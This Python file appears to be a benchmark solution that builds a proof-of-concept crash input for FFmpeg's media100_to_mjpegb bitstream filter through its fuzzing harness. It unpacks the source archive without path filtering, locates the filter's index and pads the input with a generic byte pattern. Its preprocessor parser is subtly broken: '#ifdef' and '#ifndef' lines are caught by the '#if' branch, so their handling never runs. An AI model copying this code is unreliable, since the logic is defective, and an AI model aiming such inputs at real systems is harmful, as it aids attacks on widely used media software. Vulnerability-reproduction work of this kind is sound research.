import os
import re
import tarfile
import zipfile
import tempfile
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_media100_")
        try:
            self._extract_archive(src_path, tmpdir)
            index = self._determine_bsf_index(tmpdir, "media100_to_mjpegb")
            if index is None:
                index = 0

            total_len = 1025
            data = bytearray(total_len)

            # First byte controls BSF selection in most ffmpeg BSF fuzzers
            data[0] = index & 0xFF

            # Fill the rest with a non-trivial deterministic pattern
            for i in range(1, total_len):
                data[i] = (i * 37 + 13) & 0xFF

            return bytes(data)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def _extract_archive(self, src_path: str, dst_dir: str) -> None:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(dst_dir)
        elif zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                zf.extractall(dst_dir)
        else:
            raise ValueError("Unsupported archive format: %r" % (src_path,))

    def _determine_bsf_index(self, root: str, target_name: str):
        # 1) Try to get index from the BSF fuzzer's own name array (most common)
        harness_path, harness_text = self._find_bsf_fuzzer(root)

        index = None
        if harness_text:
            index = self._index_from_local_name_array(harness_text, target_name)

        # 2) If not found, search any global string array containing the name
        if index is None:
            index = self._index_from_global_name_array(root, target_name)

        # 3) If still not found, fall back to the bitstream_filters[] enum list
        if index is None:
            index = self._index_from_bitstream_filters_list(root, target_name)

        return index

    def _find_bsf_fuzzer(self, root: str):
        best_path = None
        best_text = ""
        # Prefer files with 'bsf' in filename
        preferred_candidates = []
        other_candidates = []

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith((".c", ".cc", ".cpp", ".cxx")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in txt:
                    continue
                if "AVBSFContext" in txt or "av_bsf_" in txt or "bitstream filter" in txt:
                    if "bsf" in fn.lower():
                        preferred_candidates.append((path, txt))
                    else:
                        other_candidates.append((path, txt))

        if preferred_candidates:
            best_path, best_text = preferred_candidates[0]
        elif other_candidates:
            best_path, best_text = other_candidates[0]

        return best_path, best_text

    def _index_from_local_name_array(self, text: str, target_name: str):
        quoted = '"' + target_name + '"'
        pos = text.find(quoted)
        if pos == -1:
            return None

        start = text.rfind("{", 0, pos)
        end = text.find("}", pos)
        if start == -1 or end == -1:
            return None

        arr_text = text[start + 1:end]
        names = re.findall(r'"([^"]+)"', arr_text)
        try:
            return names.index(target_name)
        except ValueError:
            return None

    def _index_from_global_name_array(self, root: str, target_name: str):
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".inc")
        quoted = '"' + target_name + '"'
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(exts):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                pos = txt.find(quoted)
                if pos == -1:
                    continue
                start = txt.rfind("{", 0, pos)
                end = txt.find("}", pos)
                if start == -1 or end == -1:
                    continue
                arr_text = txt[start + 1:end]
                names = re.findall(r'"([^"]+)"', arr_text)
                if not names:
                    continue
                try:
                    return names.index(target_name)
                except ValueError:
                    continue
        return None

    def _read_config_macros(self, root: str):
        macros = {}
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn == "config.h" or fn.endswith("_config.h"):
                    path = os.path.join(dirpath, fn)
                    try:
                        with open(path, "r", errors="ignore") as f:
                            txt = f.read()
                    except Exception:
                        continue
                    for m in re.finditer(r"#define\s+(CONFIG_[A-Z0-9_]+)\s+(\d+)", txt):
                        macros[m.group(1)] = int(m.group(2))
                    return macros
        return macros

    def _index_from_bitstream_filters_list(self, root: str, target_name: str):
        target_sym = "ff_" + target_name + "_bsf"
        config_macros = self._read_config_macros(root)

        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.endswith(".c"):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "r", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue

                if target_sym not in txt or "bitstream_filters" not in txt:
                    continue

                m = re.search(r"bitstream_filters\s*\[[^]]*\]\s*=\s*{", txt)
                if not m:
                    continue

                start = m.end()
                end = txt.find("};", start)
                if end == -1:
                    continue

                arr_text = txt[start:end]
                names = self._parse_bsf_list_with_config(arr_text, config_macros)
                if not names:
                    continue
                try:
                    return names.index(target_name)
                except ValueError:
                    continue

        return None

    def _parse_bsf_list_with_config(self, arr_text: str, config_macros):
        lines = arr_text.splitlines()
        active_stack = [True]
        names = []

        for raw in lines:
            s = raw.strip()
            if not s:
                continue

            if s.startswith("#if"):
                tokens = s.split()
                macro_expr = tokens[1] if len(tokens) > 1 else ""
                val = 1
                if macro_expr.startswith("CONFIG_"):
                    val = 1 if config_macros.get(macro_expr, 1) else 0
                active_stack.append(bool(active_stack[-1] and val))
            elif s.startswith("#ifdef"):
                tokens = s.split()
                macro = tokens[1] if len(tokens) > 1 else ""
                val = 1 if config_macros.get(macro, 0) else 0
                active_stack.append(bool(active_stack[-1] and val))
            elif s.startswith("#ifndef"):
                tokens = s.split()
                macro = tokens[1] if len(tokens) > 1 else ""
                val = 0 if config_macros.get(macro, 0) else 1
                active_stack.append(bool(active_stack[-1] and val))
            elif s.startswith("#else"):
                if len(active_stack) > 1:
                    active_stack[-1] = not active_stack[-1]
            elif s.startswith("#endif"):
                if len(active_stack) > 1:
                    active_stack.pop()
            elif active_stack[-1]:
                for m in re.finditer(r"&ff_([A-Za-z0-9_]+)_bsf", s):
                    names.append(m.group(1))

        return names